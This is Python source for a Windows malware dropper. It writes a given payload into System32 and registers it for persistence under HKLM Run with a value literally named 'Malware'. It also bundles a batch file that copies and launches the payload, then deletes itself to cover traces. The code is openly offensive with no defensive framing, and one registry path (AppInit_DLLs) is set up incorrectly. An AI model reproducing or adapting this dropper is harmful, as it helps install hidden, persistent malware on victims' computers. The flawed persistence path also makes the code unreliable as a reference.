import winreg
import os
import zipfile

class Dropper:
    def __init__(self):
        self.key_paths = [
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "Software\\Microsoft\\Windows\\CurrentVersion\\AppInit_DLLs"
        ]

    def create(self, payload, output_path):
        malware_path = 'C:\\Windows\\System32\\my.dll'
        with open(malware_path, 'wb') as f:
            f.write(payload)
        for path in self.key_paths:
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path)
                winreg.SetValueEx(key, "Malware", 0, winreg.REG_SZ, malware_path)
                winreg.CloseKey(key)
            except WindowsError:
                pass
        with zipfile.ZipFile(output_path, 'w') as zip_file:
            zip_file.writestr('dropper.bat', self.get_dropper_bat())
            zip_file.writestr('payload.bin', payload)

    def get_dropper_bat(self):
        return b'''@echo off
echo Copie du payload...
copy payload.bin "%WINDIR%\\System32\\payload.tmp"
echo Lancement du payload...
start %WINDIR%\\System32\\payload.tmp
echo Nettoyage...
del payload.bin
del "dropper.bat"
exit'''

dropper = Dropper()
